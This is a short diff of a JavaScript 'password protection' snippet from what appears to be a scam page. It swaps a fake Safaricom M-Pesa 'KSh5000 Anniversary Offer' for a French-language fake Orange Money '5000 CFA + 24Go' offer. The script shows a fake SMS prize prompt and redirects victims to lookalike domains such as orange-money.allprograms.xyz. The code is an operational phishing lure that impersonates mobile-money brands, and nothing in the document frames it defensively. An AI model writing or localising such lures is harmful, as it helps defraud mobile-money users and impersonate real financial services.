@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'Ksh5000'
-password=prompt('SMS: Congratulations You are Eligible to receive KSh5000 Mpesa Anniversary Offer, Kindly Press OK to ACTIVATE ','Ksh5000');
-if (password != 'Ksh5000') {
-location.href='https://mpesa-reward.govprograms.info/gift';
+var password = '5000Fcfa + 24Go'
+password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 5000 CFA + 24Go OrangeMoney Offre Anniversaire, veuillez appuyer sur OK pour ACTIVER ','5000Fcfa + 24Go');
+if (password != '5000Fcfa + 24Go') {
+location.href='https://orange-money.allprograms.xyz/gift';
 }
